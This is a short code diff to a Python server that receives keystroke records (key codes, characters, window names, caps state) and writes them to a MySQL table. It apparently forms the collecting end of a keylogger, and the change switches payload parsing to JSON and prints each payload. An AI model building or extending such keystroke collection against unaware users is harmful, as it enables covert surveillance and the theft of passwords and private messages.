@@ -39,7 +39,7 @@ def addLog():
     try:
       print(data[str(key)])
       print("PUSHING TO DB")
-      pushDB(data[str(key)])
+      pushDB(json.loads(data[str(key)]))
       
       print("PUSHED TO DB")
 
@@ -55,6 +55,7 @@ def addLog():
 def pushDB(payload):
   main_cfg = load_cfg('./main_cfg.json')
   print("connecting to db")
+  print(payload)
   db = mysql.connector.connect (
     host=main_cfg['dbHost'],
     port=main_cfg['port'],
@@ -66,7 +67,7 @@ def pushDB(payload):
   mycursor = db.cursor()
   
   sql = f"INSERT INTO {main_cfg['dbTable']} {main_cfg['dbRows']} VALUES (%s, %s, %s, %s, %s, %s,%s, %s, %s)"
-  val = (f"{payload[0]}", f"{payload[1]}", f"{payload[2]}", f"{payload[3]}", f"{payload[4]}", f"{payload[5]}", f"{payload[6]}", f"{payload[7]}", f"{payload[9]}")
+  val = (f"{payload['datetime']}", f"{payload['epochTime']}", f"{payload['isKeyDown']}", f"{payload['windowName']}", f"{payload['asciiCode']}", f"{payload['asciiChar']}", f"{payload['keyName']}", f"{payload['isCaps']}", f"{payload['processedKey']}")
   print("executing query")
   mycursor.execute(sql, val)
   
